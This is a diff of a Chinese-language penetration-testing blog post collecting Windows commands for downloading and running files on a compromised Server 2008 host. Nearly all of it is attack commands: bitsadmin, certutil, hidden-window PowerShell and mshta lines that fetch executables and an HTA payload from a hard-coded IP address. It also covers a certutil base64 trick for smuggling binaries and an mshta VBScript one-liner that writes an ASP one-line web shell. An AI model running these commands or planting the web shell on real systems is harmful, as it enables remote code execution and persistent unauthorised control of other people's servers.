@@ -8,16 +8,34 @@ topics = ["Pentest"]
 
 +++
 
+环境：Windows Server 2008 R2 Enterprise
+
 ### 0x00 bitsadmin下载文件
-win2008
 ```bash
 bitsadmin /rawreturn /transfer getfile http://114.115.214.203/a.exe C:\Windows\Temp\a.exe
-bitsadmin /rawreturn /transfer getpayload 114.115.214.203/a.zip C:\Windows\Temp\a.zip
-bitsadmin /transfer myDownLoadJob /download /priority normal "http://114.115.214.203/a.exe" "C:\Windows\Temp\a.exe"
+bitsadmin /rawreturn /transfer getpayload http://114.115.214.203/a.zip C:\Windows\Temp\a.zip
+bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.214.203/a.exe C:\Windows\Temp\a.exe
 ```
 
-### 0x01 powershell下载文件
-win2008
+### 0x01 certutil下载文件
+保存在当前目录
+```bash
+certutil -urlcache -split -f http://114.115.214.203/a.exe a.exe
+```
+
+有时会下载二进制文件的base64编码后的字符串，然后再解码
+```
+本地：certutil -encode cc.exe base64.txt
+目标：certutil -urlcache -split -f http://114.115.214.203/base64.txt
+目标：certutil -decode base64.txt cc.exe
+```
+
+文件会以二进制形式缓存到目录：C:\Users\Administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
+```bash
+certutil -urlcache -f http://114.115.214.203/a.exe
+```
+
+### 0x02 powershell下载文件
 ```bash
 powershell (new-object System.Net.WebClient).DownloadFile("http://114.115.214.203/a.exe","C:\Windows\Temp\a.exe")
 
@@ -25,21 +43,15 @@ powershell (new-object System.Net.WebClient).DownloadFile("http://114.115.214.20
 powershell -w hidden -c (new-object System.Net.WebClient).DownloadFile("http://114.115.214.203/a.exe","C:\Windows\Temp\a.exe")
 ```
 
-### 0x02 certutil下载文件
+### 0x03 mshta下载文件与执行远程文件
+使用mshta命令的文件都会被缓存到：C:\Users\Administrator\AppData\Local\Microsoft\Windows\Temporary Internet Files
+
+* 执行远程hta文件
+
 ```bash
-certutil -urlcache -split -f http://114.115.214.203/test.txt test.txt
-
-certutil -urlcache -split -f http://114.115.214.203/a.exe a.exe
-
-#写文件的方法：
-mshta vbscript:createobject("scripting.filesystemobject").createtextfile("test11.txt",2,ture).writeline("PCVleGVjdXRlKHJlcXVlc3QoImwiKSklPg==")(window.close)
-certutil -decode test11.txt mu.asp #一句话马
-type mu.asp
-```
-
-### 0x03 mshta执行远程hta
-```
 mshta http://114.115.214.203/payload.hta
+mshta http://114.115.214.203/a.exe
+#payload.hta和a.exe都会被缓存在IE的缓存目录
 ```
 payload.hta
 ```html
@@ -62,5 +74,20 @@ demo
 </body>
 </html>
 ```
+
+* 写文件的方法
+
+```
+mshta vbscript:createobject("scripting.filesystemobject").createtextfile("a.asp",2,ture).writeline("<%execute(request('l'))%>")(window.close)
+```
+
+<br />
+#### Reference(侵删)：
+* [https://xianzhi.aliyun.com/forum/topic/1654](https://xianzhi.aliyun.com/forum/topic/1654)
+* [https://evi1cg.me/archives/Tricks.html](https://evi1cg.me/archives/Tricks.html)
+* [https://3gstudent.github.io/3gstudent.github.io/渗透测试中的certutil.exe/](https://3gstudent.github.io/3gstudent.github.io/渗透测试中的certutil.exe/)
+
+
+
 
 未完待续。。。
